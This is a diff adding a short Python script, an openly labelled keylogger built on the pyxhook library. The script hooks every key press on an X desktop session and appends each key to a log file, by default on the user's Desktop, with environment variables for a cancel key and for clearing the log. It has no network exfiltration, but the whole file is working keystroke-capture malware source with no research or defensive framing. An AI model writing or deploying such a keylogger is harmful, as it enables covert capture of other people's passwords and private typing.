@@ -1,0 +1,53 @@
+import os
+import pyxhook
+#sudo apt-get install python-xlib (need xlib to run pyxhook)
+
+# Function to initialize the logger and clean up if necessary
+def initialize_logger():
+    log_file_path = os.getenv('pylogger_file', os.path.expanduser('~/Desktop/file.log'))
+    cancel_key_char = os.getenv('pylogger_cancel', '`')
+
+    # Convert cancel key to its ASCII equivalent
+    cancel_key = ord(cancel_key_char[0])
+
+    # Check if the log file should be cleared on startup
+    if os.getenv('pylogger_clean'):
+        try:
+            if os.path.exists(log_file_path):
+                os.remove(log_file_path)
+        except Exception as e:
+            print(f"Error while trying to clean log file: {e}")
+    
+    return log_file_path, cancel_key
+
+# Function to handle key press events
+def log_key_press(event, log_file_path):
+    try:
+        with open(log_file_path, 'a') as log_file:
+            log_file.write(f'{event.Key}\n')
+    except Exception as e:
+        print(f"Error while writing to log file: {e}")
+
+# Main function to start the keylogger
+def start_keylogger():
+    log_file_path, cancel_key = initialize_logger()
+
+    # Create a hook manager instance
+    hook_manager = pyxhook.HookManager()
+    hook_manager.KeyDown = lambda event: log_key_press(event, log_file_path)
+
+    # Set up the keyboard hook
+    hook_manager.HookKeyboard()
+    try:
+        hook_manager.start()  # Start the hook to listen for key events
+    except KeyboardInterrupt:
+        print("Keylogger interrupted by user.")
+    except Exception as e:
+        # Handle and log exceptions
+        error_msg = f"Error occurred during keylogging:\n{e}"
+        print(error_msg)
+        with open(log_file_path, 'a') as log_file:
+            log_file.write(f'\n{error_msg}')
+
+if __name__ == "__main__":
+    start_keylogger()
